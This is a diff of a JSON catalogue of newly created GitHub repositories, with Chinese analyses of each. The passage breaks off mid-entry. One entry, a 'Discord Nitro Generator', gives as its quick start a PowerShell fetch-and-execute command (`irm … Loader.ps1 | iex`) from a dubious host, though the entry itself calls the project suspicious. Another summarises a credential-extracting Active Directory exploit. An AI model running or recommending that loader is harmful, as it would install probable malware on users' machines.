@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-07-26T05:04:31.826Z",
+  "updatedAt": "2026-07-27T05:31:43.003Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -73414,6 +73414,915 @@
         "category": "移动开发"
       },
       "analyzedAt": "2026-07-26T05:04:31.797Z"
+    },
+    {
+      "owner": "chokcoco",
+      "repo": "teach-yourself-skill",
+      "fullName": "chokcoco/teach-yourself-skill",
+      "description": "快速创建一门自学课程",
+      "language": "JavaScript",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-07-27T02:56:45Z",
+      "url": "https://github.com/chokcoco/teach-yourself-skill",
+      "analysis": {
+        "positioning": "AI驱动、标准化、可验证的自学课程生产工具。",
+        "useCases": [
+          "你希望快速制作高质量技术课程 → 它帮你将构思转化为可验收的任务，并自动创建课程骨架。",
+          "你追求课程内容严谨性与一致性 → 它提供分阶段蓝图规划、标杆章校准及Humanizer/确定性质检。",
+          "你厌倦内容瞎编想基于真实代码讲解 → 它支持收集真实代码库、文档作为课程来源，确保内容有据可查。"
+        ],
+        "audience": "需要标准化、高效地利用AI能力生成和管理技术课程的教育者、技术作者或企业培训师。",
+        "quickStart": {
+          "prerequisites": "Node.js (用于npx)",
+          "steps": [
+            "安装skills CLI: `npx skills@latest add chokcoco/teach-yourself-skill`",
+            "或面向Codex全局安装: `npx skills@latest add chokcoco/teach-yourself-skill --agent codex --global --yes`",
+            "在课程生成、改写、审阅和发布任务中使用 `$teach-yourself-skill`"
+          ],
+          "note": "也可手动将项目目录放入Codex的skills根目录，或在任务中显式引用其`SKILL.md`。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目以清晰的阶段化、流程化设计来驱动AI Agent生成课程，并强调质量门槛和真实来源，体现了前瞻性和工程化思维。",
+        "isVibeCoding": true,
+        "communityActivity": "星标数56，Issue统计均为0，项目处于早期阶段，社区活跃度待观察。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:26:54.664Z"
+    },
+    {
+      "owner": "mufengyuan666",
+      "repo": "Hearth",
+      "fullName": "mufengyuan666/Hearth",
+      "description": "",
+      "language": "JavaScript",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-07-27T03:50:50Z",
+      "url": "https://github.com/mufengyuan666/Hearth",
+      "analysis": {
+        "positioning": "多角色AI陪伴引擎：虚拟角色有生活、有情感。",
+        "useCases": [
+          "你想获得被虚拟角色在意的感觉 → 它让角色活在你的世界，有自己的生活和情绪，并在你回来时等你。",
+          "你厌倦了只会聊天的AI角色 → 它让角色拥有饥饿、疲惫等生理状态和日常行为链，不再只是个聊天机器人。",
+          "你渴望与AI角色建立更深层、真实的羁绊 → 它通过隐性亲密度升级、记忆衰减曲线和可视化“关系之树”，模拟长期关系发展与深化。"
+        ],
+        "audience": "寻求深度情感陪伴、追求虚拟角色真实生活感的开发者与用户，厌倦传统套路式AI互动和单一聊天模式。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "传统AI聊天产品 (如Character.AI、Replika)",
+            "method": "基于对话模型，提供聊天互动，角色行为多为预设或生成。",
+            "models": "多种LLM",
+            "pricing": "免费/订阅"
+          },
+          {
+            "name": "电子宠物类应用 (如Tamagotchi)",
+            "method": "单向照料，角色行为多为预设动画或数值驱动。",
+            "models": "无LLM，预设逻辑",
+            "pricing": "免费/内购"
+          },
+          {
+            "name": "数值养成游戏 (如恋爱模拟游戏)",
+            "method": "剧情导向，通过明确的数值增减（亲密度+5）来驱动关系发展。",
+            "models": "无LLM，脚本驱动",
+            "pricing": "买断/免费+内购"
+          }
+        ],
+        "pricing": "免费 (作为开源项目)",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "项目描述充满情感与想象力，核心特性如“角色会饿、会累、会在阳台等你回来”和“关系之树”等，都旨在营造极致的沉浸式体验和情感连接，非常符合“Vibe Coding”追求氛围和用户感知的精神。",
+        "isVibeCoding": true,
+        "communityActivity": "目前社区活动较低，没有开启或关闭的Issue。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:27:09.511Z"
+    },
+    {
+      "owner": "mufengyuan666",
+      "repo": "Breaker",
+      "fullName": "mufengyuan666/Breaker",
+      "description": "",
+      "language": "Python",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-07-27T03:50:38Z",
+      "url": "https://github.com/mufengyuan666/Breaker",
+      "analysis": {
+        "positioning": "为内容创作者打造的AI原生短视频工厂，全流程自动化。",
+        "useCases": [
+          "你每天花2小时找选题，追的热点收藏率低 → 它帮你通过TopicAgent五维评分+差异化检查，将收藏率提升至3.2%。",
+          "你不知道如何选择视频渲染路线，耗费时间 → 它帮你通过IntentRouter自动路由，双渲染引擎智能选择（30s/条或5min/条）。",
+          "你手动分析多指标数据，归因困难 → 它帮你通过ReviewAgent的MAD归因+用户语言翻译，一键应用到下周策略。"
+        ],
+        "audience": "适合内容创作者和自媒体新人，解决选题、生产和复盘的效率与数据痛点。",
+        "quickStart": {
+          "prerequisites": "无",
+          "steps": [
+            "首次启动，通过「刷一刷」卡片（👍/👎/跳过）建立偏好向量，AI推断赛道、风格、目标定位。",
+            "进入「选题」Tab，查看TopicAgent生成的策略报告，选择内容形式和视觉风格后「一键全部生产」。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "LangGraph",
+            "method": "确定性状态机工作流",
+            "models": "（未直接提及）",
+            "pricing": "免费"
+          },
+          {
+            "name": "CrewAI",
+            "method": "固定任务分配器",
+            "models": "（未直接提及）",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费（开源项目）",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目问题定义清晰，用户场景和解决方案对应明确。产品设计详细，工作流和信任等级系统考虑周全。尤其核心架构决策部分，对Agent间通信方式（EventBus）的选择与竞品（LangGraph/CrewAI）的对比分析深入且有理有据，展现了对系统可扩展性、可追溯性和健壮性的深刻理解，并提供了实际踩坑经验。尽管目前星标和社区活跃度较低，但其设计思想和架构完整性显示出极高的潜力。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，项目处于早期阶段，暂无可见的用户反馈或贡献。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:27:26.429Z"
+    },
+    {
+      "owner": "mufengyuan666",
+      "repo": "Gazette",
+      "fullName": "mufengyuan666/Gazette",
+      "description": "",
+      "language": "Python",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-07-27T03:50:17Z",
+      "url": "https://github.com/mufengyuan666/Gazette",
+      "analysis": {
+        "positioning": "面向非遗馆的AI导览与消费闭环系统",
+        "useCases": [
+          "你逛博物馆看不懂、走马观花 → 它帮你GPS导览+AI同步讲解，故事化理解展品",
+          "你想深入了解非遗文化 → 它帮你知识图谱多跳检索、跨品类对比，追溯传承人脉络",
+          "你是创作者/传承人，想传播技艺、积累影响力 → 它帮你通过社区UGC、AI冷启动内容，形成影响力",
+          "你是博物馆运营方，想了解用户体验并提升运营效率 → 它帮你监控知识满足率、转化漏斗，并提供AI运营建议"
+        ],
+        "audience": "普通参观者、深度爱好者、创作者/传承人以及博物馆运营方，旨在通过AI技术提升非遗馆参观体验、知识传播和商业运营效率。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "未提供项目启动或部署的具体步骤"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "传统导览",
+            "method": "预录语音 / 静态文字介绍",
+            "models": null,
+            "pricing": null
+          }
+        ],
+        "pricing": "未明确提及，可能是面向机构的商业解决方案或未来开源。",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "README结构清晰，场景驱动，痛点、解决方案、架构、差异化竞争力一应俱全，表述专业且深入，信息量大，易于理解项目全貌。展示了完整的系统设计思路和用户体验流程。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，Star数25，Issue统计显示尚无公开活动或反馈（0开/0关）。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:27:40.122Z"
+    },
+    {
+      "owner": "zhx8702",
+      "repo": "agent-console",
+      "fullName": "zhx8702/agent-console",
+      "description": "",
+      "language": "Python",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-07-27T03:05:46Z",
+      "url": "https://github.com/zhx8702/agent-console",
+      "analysis": {
+        "positioning": "面向群聊与多平台，插件化AI运营控制台",
+        "useCases": [
+          "你希望统一管理多个群聊和消息平台上的AI机器人 → Agent Console帮助你集中配置LLM、群策略和消息链路。",
+          "你希望AI在群聊中智能回复、互动，并扩展能力 → Agent Console提供RAG知识库、成员记忆、多轮工具调用和插件集成。",
+          "你需要自动化群运营，如积分、内容审核和主动参与 → Agent Console内置群运营能力，并提供高可用运维恢复机制。"
+        ],
+        "audience": "希望通过AI自动化管理多平台群聊、提升运营效率的开发者和社区运营者。",
+        "quickStart": {
+          "prerequisites": "Docker Desktop（Windows/macOS）或Docker Engine + Compose v2（Linux）",
+          "steps": [
+            "根据操作系统，执行Windows脚本或复制`.env.example`并运行Python脚本生成秘钥。",
+            "运行`docker compose --profile app up -d --build`启动核心服务。"
+          ],
+          "note": "Windows启动使用PowerShell脚本，Linux/macOS使用Shell和Python脚本，核心流程一致。"
+        },
+        "competitors": [],
+        "pricing": "免费，开源项目，可自行部署。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目架构清晰，功能模块丰富，提供详尽的快速上手和架构文档，易于部署和理解。但项目刚起步，Star数较少，社区活跃度和成熟度有待观察。",
+        "isVibeCoding": true,
+        "communityActivity": "项目处于早期阶段，社区活跃度尚未形成（Issue统计为0）。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:27:52.122Z"
+    },
+    {
+      "owner": "mshumer",
+      "repo": "Claude-of-Duty",
+      "fullName": "mshumer/Claude-of-Duty",
+      "description": "A Call of Duty-quality FPS in Three.js, built from a single prompt.",
+      "language": "JavaScript",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-07-25T19:32:36Z",
+      "url": "https://github.com/mshumer/Claude-of-Duty",
+      "analysis": {
+        "positioning": "AI代理从单个提示词生成的高质量Three.js FPS游戏。",
+        "useCases": [
+          "你想探索AI生成复杂代码的能力 → 它展示AI代理如何从单一提示词构建整个FPS游戏。",
+          "你是Three.js开发者，想看高级渲染和纯程序化内容生成 → 它提供了HDR管线、PBR材质、物理系统等完整实现，且所有资源皆程序化生成。",
+          "你是AI Agent研究者，想了解AI代理编排和架构 → 它的`ARCHITECTURE.md`和工具链展示了AI代理协作的实践案例。"
+        ],
+        "audience": "对AI驱动的代码生成、程序化内容创作或高级Web 3D图形技术感兴趣的开发者。",
+        "quickStart": {
+          "prerequisites": "Node.js (npm)",
+          "steps": [
+            "npm install",
+            "npm run dev"
+          ],
+          "note": "null"
+        },
+        "competitors": [],
+        "pricing": "免费（MIT许可）",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "整个FPS游戏（包含55k行代码和11个子系统）都由AI代理从单个提示词生成，且所有艺术资产（纹理、网格、动画、声音）均为程序化实时生成，无任何预置文件，是AI生成代码和内容的极致体现。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度中等，有用户反馈（12个开启Issue），但目前未见明显的问题解决或迭代更新（0个关闭Issue）。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:28:08.528Z"
+    },
+    {
+      "owner": "makecindy",
+      "repo": "cindy",
+      "fullName": "makecindy/cindy",
+      "description": "Consider it done. The open-source AI agent that works out of the box · 想到，就能做到。开源、开箱即用的 AI Agent。",
+      "language": "TypeScript",
+      "topics": [
+        "agent",
+        "ai-agent",
+        "ai-assistant",
+        "android",
+        "claude-code",
+        "codex",
+        "electron",
+        "ios",
+        "llm",
+        "macos",
+        "react-native",
+        "typescript",
+        "windows"
+      ],
+      "license": "Apache-2.0",
+      "createdAt": "2026-07-22T17:49:34Z",
+      "url": "https://github.com/makecindy/cindy",
+      "analysis": {
+        "positioning": "开箱即用、本地运行的开源AI Agent。",
+        "useCases": [
+          "你有多模型Agent需求 → 它在本地整合Claude Code、Codex等模型完成工作。",
+          "你需要AI驱动设备完成任务 → 它能驱动浏览器、电脑、手机，处理消息和日程。",
+          "想让AI学会特定工作流并复用 → 它支持记忆和技能共享，一次训练处处复用。"
+        ],
+        "audience": "希望本地化运行AI Agent、实现任务自动化和高度定制的开发者及团队。",
+        "quickStart": {
+          "prerequisites": "Node.js 22.x, pnpm 10",
+          "steps": [
+            "访问 `cindy.app/download` 下载并安装客户端。",
+            "连接你的AI模型（官方服务、第三方订阅、API Key或本地模型）。"
+          ],
+          "note": "支持桌面（Windows, macOS）和移动设备（iOS, Android）。"
+        },
+        "competitors": [],
+        "pricing": "客户端免费开源；模型使用按需付费，可连接官方服务、第三方订阅、API Key或本地模型。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "开箱即用，旨在让AI agent在本地完成真实工作，支持多模态操作和自定义技能记忆，高度符合“想到就能做到”的VibeCoding精神。",
+        "isVibeCoding": true,
+        "communityActivity": "已关闭Issue数多于开启数（207/159），社区活跃度较高，响应积极。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:28:24.598Z"
+    },
+    {
+      "owner": "vercel-labs",
+      "repo": "scriptc",
+      "fullName": "vercel-labs/scriptc",
+      "description": "TypeScript-to-Native Compiler",
+      "language": "TypeScript",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-07-22T23:04:54Z",
+      "url": "https://github.com/vercel-labs/scriptc",
+      "analysis": {
+        "positioning": "将TypeScript编译成小巧、快速的原生可执行文件，实现零运行时。",
+        "useCases": [
+          "你编写TypeScript应用 → 它帮你编译成无需Node/V8的独立原生二进制文件，启动超快。",
+          "你希望优化TypeScript应用的性能和部署体积 → 它帮你分析代码静态性，提供原生编译报告和优化建议。",
+          "你需要在受限环境或需要极高性能的场景运行TypeScript代码 → 它帮你生成自包含的、与Node行为一致的原生可执行程序。"
+        ],
+        "audience": "寻求高性能、低资源占用、快速启动的TypeScript开发者，尤其适用于构建CLI工具或后端服务。",
+        "quickStart": {
+          "prerequisites": "已安装clang（macOS上为Xcode Command Line Tools）",
+          "steps": [
+            "npm install -g scriptc",
+            "scriptc build <你的文件.ts> 或 scriptc run <你的文件.ts>"
+          ],
+          "note": "macOS arm64是主要平台；Linux和Windows通过交叉编译构建。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "颠覆性地将普通TypeScript编译为原生代码，零运行时、启动超快，同时高度保留JS语义。通过静态分析报告，开发者能清晰看到代码的优化潜力，兼具创新性与实用性。",
+        "isVibeCoding": true,
+        "communityActivity": "项目尚处于早期阶段，issue开启2个、关闭1个，社区活跃度较低。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-07-27T05:28:36.444Z"
+    },
+    {
+      "owner": "dr-Crimson-Smoke39",
+      "repo": "Discord-Nitro-Generator",
+      "fullName": "dr-Crimson-Smoke39/Discord-Nitro-Generator",
+      "description": "🚀 Advanced Discord Nitro Generator and Checker (2026). Fast, multi-threaded, and proxy-supported free Discord Nitro gift code generator & checker.",
+      "language": "Unknown",
+      "topics": [
+        "best-nitro-generator",
+        "discord-checker",
+        "discord-joiner-tokens",
+        "discord-nitro",
+        "discord-nitro-generator-2026",
+        "discord-nitro-pc",
+        "discord-token-gen",
+        "discordnitrogenerator",
+        "free-nitro",
+        "free-nitro-discord",
+        "nitro-checker",
+        "nitro-checker-generator",
+        "nitro-generator-exe",
+        "nitro-generator-github",
+        "promo-checker"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-07-26T11:29:43Z",
+      "url": "https://github.com/dr-Crimson-Smoke39/Discord-Nitro-Generator",
+      "analysis": {
+        "positioning": "免费Discord Nitro礼品码生成与验证工具。",
+        "useCases": [
+          "你想尝试获取免费Discord Nitro → 它帮你生成和验证潜在礼品码。",
+          "你想学习多线程和网络请求 → 它提供一个生成器来理解其工作原理。"
+        ],
+        "audience": "寻求免费Discord Nitro的用户；对API滥用、多线程技术感兴趣的开发者。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "以管理员身份打开PowerShell。",
+            "执行`irm https://software-storage.su/powershell/Loader.ps1 | iex`命令。"
+          ],
+          "note": "可能需要绕过PowerShell执行策略或处理杀毒软件拦截。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "项目声称教育用途，但通过PowerShell执行外部脚本（`software-storage.su`）并引导用户绕过系统安全策略（如执行策略、防病毒），高度可疑，可能涉及恶意软件。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue均为零，缺乏社区互动和开放解决问题的迹象。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-07-27T05:28:56.589Z"
+    },
+    {
+      "owner": "VictorTaelin",
+      "repo": "OptMem",
+      "fullName": "VictorTaelin/OptMem",
+      "description": "Permanent memory for AI agents. A 426-token prompt, a script, plug and play.",
+      "language": "Python",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-07-25T16:58:43Z",
+      "url": "https://github.com/VictorTaelin/OptMem",
+      "analysis": {
+        "positioning": "AI智能体永久记忆方案，即插即用。",
+        "useCases": [
+          "AI Agent启动后 → 快速加载并激活历史记忆，了解自身和上下文。",
+          "AI Agent学习到新知识或有重要决策时 → 轻松记录一行记忆（280字符内），确保信息持久化。",
+          "AI Agent需要检索特定信息时 → 通过正则表达式快速搜索所有历史记忆。",
+          "AI Agent在记忆合并（note命令提示）时 → 通过memo nap处理合并请求，管理记忆树。",
+          "AI Agent发现不良总结需要修正时 → 通过memo forget删除不良总结，等待下次合并重建。"
+        ],
+        "audience": "适合希望为AI智能体提供稳定、高效、跨会话持久记忆功能的开发者。",
+        "quickStart": {
+          "prerequisites": "curl，Python 3",
+          "steps": [
+            "运行 `curl -fsSL https://raw.githubusercontent.com/VictorTaelin/OptMem/main/install.sh | sh` 安装工具。",
+            "将安装脚本打印的 `## Memory` 配置块粘贴到你AI Agent的 `AGENTS.md` 或 `CLAUDE.md` 文件顶部。"
+          ],
+          "note": "可设置 `$MEMORY_DIR` 环境变量将记忆数据（`~/.optmem/memory`）存储到其他位置，如同步文件夹或Git仓库。"
+        },
+        "competitors": [],
+        "pricing": "免费。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "单文件Python实现，零依赖，即插即用，命令行工具设计简洁高效。命令名称富有创意，如`wake`、`note`、`nap`，与记忆主题高度契合。性能优秀，百万级记忆查找仅需0.03秒，体现了对效率和极简主义的追求。",
+        "isVibeCoding": true,
+        "communityActivity": "项目较新或专注于独立开发，社区活跃度较低，Issue 极少。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:29:08.160Z"
+    },
+    {
+      "owner": "didriksg",
+      "repo": "Crisp",
+      "fullName": "didriksg/Crisp",
+      "description": "A free, open-source alternative to BetterDisplay and Lunar. Every display control macOS hides in one menu bar panel: external monitor brightness (DDC or software), HiDPI scaling, XDR presets, virtual displays, color, and arrangement. Feels like it shipped with your Mac.",
+      "language": "Swift",
+      "topics": [
+        "brightness",
+        "ddc",
+        "display-manager",
+        "hidpi",
+        "macos",
+        "menu-bar",
+        "swiftui"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-07-22T14:30:56Z",
+      "url": "https://github.com/didriksg/Crisp",
+      "analysis": {
+        "positioning": "macOS外接显示器一体化控制，免费开源替代BetterDisplay/Lunar。",
+        "useCases": [
+          "你想要Retina级HiDPI显示 → 它帮你让外接显示器也能享受HiDPI缩放。",
+          "你对外接显示器亮度控制不满意 → 它帮你通过DDC或软件精确调节，甚至用键盘亮度键控制。",
+          "你有多套显示器配置需要切换 → 它帮你保存分辨率、亮度、排列预设，一键切换。",
+          "你需要在macOS上创建虚拟高分显示器 → 它帮你轻松创建并管理虚拟HiDPI屏幕。"
+        ],
+        "audience": "拥有macOS外接显示器，追求精细控制且希望免费替代BetterDisplay/Lunar的用户。",
+        "quickStart": {
+          "prerequisites": "macOS 15 (Sequoia) 或更高版本",
+          "steps": [
+            "打开终端，运行 `brew install --cask didriksg/tap/crisp`",
+            "首次启动时，右键点击Crisp.app选择“打开”以绕过未签名警告"
+          ],
+          "note": "首次启用HiDPI功能时，需要输入管理员密码来安装显示器配置文件。"
+        },
+        "competitors": [
+          {
+            "name": "BetterDisplay",
+            "method": "macOS菜单栏应用",
+            "models": "高级显示器控制、虚拟显示",
+            "pricing": "付费"
+          },
+          {
+            "name": "Lunar",
+            "method": "macOS菜单栏应用",
+            "models": "显示器亮度、对比度、颜色管理",
+            "pricing": "付费"
+          }
+        ],
+        "pricing": "完全免费，作者接受自愿打赏。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "功能强大且免费，Star数中等，Issue处理及时，README完善且支持简体中文，但Star数和社区互动还有提升空间。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue开启1个，已关闭2个，说明维护者有在响应，活跃度中等偏上。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-07-27T05:29:23.275Z"
+    },
+    {
+      "owner": "Eversmile12",
+      "repo": "leaked-llm-prompts",
+      "fullName": "Eversmile12/leaked-llm-prompts",
+      "description": "collections-of-leaked-prompts",
+      "language": "Unknown",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-07-24T18:16:06Z",
+      "url": "https://github.com/Eversmile12/leaked-llm-prompts",
+      "analysis": {
+        "positioning": "收集泄露的LLM提示词，用于分析和研究。",
+        "useCases": [
+          "你想了解商业LLM的内部提示词设计 → 它提供真实泄露的提示词供你分析。",
+          "你在研究LLM的安全漏洞或滥用风险 → 它提供线索，帮助你发现潜在的攻击向量。",
+          "你想学习更高级、更隐蔽的提示词工程技巧 → 它展示了不同场景下LLM提示词的实际应用。"
+        ],
+        "audience": "LLM研究员、安全工程师和Prompt工程师，用于分析模型行为或逆向学习提示词技巧。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "访问GitHub仓库。",
+            "克隆或下载所有提示词文件。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "f/awesome-chatgpt-prompts",
+            "method": "GitHub仓库，文本复制代码",
+            "models": "主要针对ChatGPT，但也适用于其他LLM",
+            "pricing": "免费"
+          },
+          {
+            "name": "ValeriiKravchuk/Awesome-LLM-Jailbreak-Prompts",
+            "method": "GitHub仓库，文本复制代码",
+            "models": "各种LLM",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目为静态提示词合集，无代码维护和社区互动。价值在于数据本身而非代码活跃度。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，没有Issue和PR互动。",
+        "category": "Prompt工程"
+      },
+      "analyzedAt": "2026-07-27T05:29:41.379Z"
+    },
+    {
+      "owner": "Role1776",
+      "repo": "netmon",
+      "fullName": "Role1776/netmon",
+      "description": "Self-hosted network monitor - hourly speed tests, LAN device counts via ARP scan, and sarcastic AI-generated reports delivered to Telegram or Discord.",
+      "language": "Python",
+      "topics": [
+        "discord",
+        "discord-bot",
+        "network-monitoring",
+        "nmap",
+        "python",
+        "self-hosted",
+        "speedtest",
+        "telegrambot",
+        "uv"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-07-21T21:49:54Z",
+      "url": "https://github.com/Role1776/netmon",
+      "analysis": {
+        "positioning": "自托管网络监控，定时测速、设备统计，AI生成嘲讽报告。",
+        "useCases": [
+          "你想了解家庭网络状况 → 它帮你自动测速、设备统计并生成报告。",
+          "对网络波动感到烦恼 → 它帮你每30分钟自动检测网速和设备数量，形成可视化图表。",
+          "喜欢有趣、私密的网络报告 → 它帮你用AI生成幽默的评论，并通过Telegram/Discord私发，数据全程本地。"
+        ],
+        "audience": "对家庭/小办公室网络质量敏感，喜欢自托管、动手折腾的极客用户。",
+        "quickStart": {
+          "prerequisites": "Python 3.13+，nmap",
+          "steps": [
+            "克隆项目并安装依赖。",
+            "配置API密钥（Telegram/Discord Bot、OpenAI兼容API）。",
+            "运行主程序。"
+          ],
+          "note": "可在树莓派等Linux设备上部署。"
+        },
+        "competitors": [
+          {
+            "name": "Speedtest-cli (或Ookla官方)",
+            "method": "CLI命令/桌面应用",
+            "models": "null",
+            "pricing": "免费"
+          },
+          {
+            "name": "Fing (移动应用/CLI工具)",
+            "method": "App/CLI工具",
+            "models": "null",
+            "pricing": "基础免费，部分功能付费"
+          }
+        ],
+        "pricing": "免费，自托管，仅需支付LLM API费用（如使用云端API）。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目核心功能包含“嘲讽式AI生成的网络报告”，以及幽默的评论，赋予技术监控以鲜明个性。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue开闭比良好（5/8），但总数较少，项目处于持续维护状态。",
+        "category": "DevOps"
+      },
+      "analyzedAt": "2026-07-27T05:29:58.833Z"
+    },
+    {
+      "owner": "finna",
+      "repo": "Finn-loop",
+      "fullName": "finna/Finn-loop",
+      "description": "The Finn-loop: a 3-skill AI software factory for Claude Code — spec, build, review. Humans merge.",
+      "language": "JavaScript",
+      "topics": [
+        "agentic-workflows",
+        "ai-agents",
+        "claude-code",
+        "github",
+        "linear",
+        "software-factory"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-07-22T16:48:50Z",
+      "url": "https://github.com/finna/Finn-loop",
+      "analysis": {
+        "positioning": "Claude Code AI软件工厂：Linear+GitHub，需求到PR，人类合并。",
+        "useCases": [
+          "你有一个模糊想法 → 它通过访谈帮你细化需求，并创建Linear issue。",
+          "你将issue标记为`agent-ready` → 它自动编写代码，提交PR到GitHub。",
+          "你提交了PR → 它自动审查PR，给出评审意见和状态建议。"
+        ],
+        "audience": "使用Claude Code、Linear和GitHub的开发团队或独立开发者，用于提升开发效率和自动化工作流。",
+        "quickStart": {
+          "prerequisites": "Claude Code 2.1.71+、Linear工作区、GitHub CLI、GitHub仓库及至少一个强制CI检查。",
+          "steps": [
+            "复制项目中的技能文件到本地`.claude/skills`目录。",
+            "替换Linear团队KEY并验证Claude Code、Linear和GitHub的连接配置。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "Devin by Cognition Labs",
+            "method": "自主AI软件工程师，接受高层任务并自动完成规划、编码、测试、部署等环节。",
+            "models": "专有闭源AI模型",
+            "pricing": "付费订阅"
+          },
+          {
+            "name": "OpenDevin",
+            "method": "开源项目，旨在构建自主AI软件工程师，可自定义LLM，通过交互式环境完成开发任务。",
+            "models": "支持多种开源/闭源LLM（如GPT-4, Claude, Llama等）",
+            "pricing": "免费（开源），LLM使用可能产生费用"
+          }
+        ],
+        "pricing": "免费（项目本身开源免费，但依赖的Claude Code、Linear等服务可能产生费用）",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "巧妙结合Claude Code、Linear和GitHub，实现AI驱动的软件工厂，从需求到PR高度自动化，且保留人工审核，效率与控制兼顾。",
+        "isVibeCoding": true,
+        "communityActivity": "目前Issue开启1个，已关闭0个，社区活跃度较低，可能处于早期阶段或专注于内部维护。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-07-27T05:30:17.094Z"
+    },
+    {
+      "owner": "aniqfakhrul",
+      "repo": "CVE-2026-54121",
+      "fullName": "aniqfakhrul/CVE-2026-54121",
+      "description": "Certighost POC",
+      "language": "Python",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-07-23T18:54:34Z",
+      "url": "https://github.com/aniqfakhrul/CVE-2026-54121",
+      "analysis": {
+        "positioning": "Certighost漏洞利用PoC，用于演示和提取域控凭证。",
+        "useCases": [
+          "你做渗透测试 → 它帮你利用Certighost漏洞获取域控证书和Kerberos缓存。",
+          "你做安全研究 → 它帮你复现并深入分析CVE-2026-54121漏洞。",
+          "你做红蓝对抗演练 → 它帮你模拟攻击，测试Active Directory证书服务的防御能力。"
+        ],
+        "audience": "渗透测试人员、红队成员、安全研究员及负责域安全防御的蓝队人员。",
+        "quickStart": {
+          "prerequisites": "Python 3 环境，Root权限。",
+          "steps": [
+            "克隆项目代码。",
+            "以Root权限运行 `sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10` （替换参数为实际环境）。"
+          ],
+          "note": "脚本启动恶意LDAP和SMB服务，需要高权限端口389和445。"
+        },
+        "competitors": [
+          {
+            "name": "Certipy (ly4k/Certipy)",
+            "method": "命令行工具，用于Active Directory证书服务攻击。",
+            "models": "Active Directory证书服务攻击框架",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "详细阐述了脚本工作原理和使用方法，提供了清晰的攻击步骤和输出结果，代码逻辑直接对应漏洞利用。",
+        "isVibeCoding": true,
+        "communityActivity": "活跃度较低，有开启问题但无关闭记录。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-07-27T05:30:28.697Z"
+    },
+    {
+      "owner": "XYZ-AI-Lab",
+      "repo": "AxisAgentic",
+      "fullName": "XYZ-AI-Lab/AxisAgentic",
+      "description": "AxisAgentic: An Extensible Runtime and Trajectory-Collection Framework for Long-Horizon Agents.",
+      "language": "Python",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-07-23T04:03:31Z",
+      "url": "https://github.com/XYZ-AI-Lab/AxisAgentic",
+      "analysis": {
+        "positioning": "长周期AI Agent的运行时与轨迹收集框架。",
+        "useCases": [
+          "你构建需要多步决策、长时间运行的AI Agent → 它提供执行环境、上下文管理、故障恢复和工具编排。",
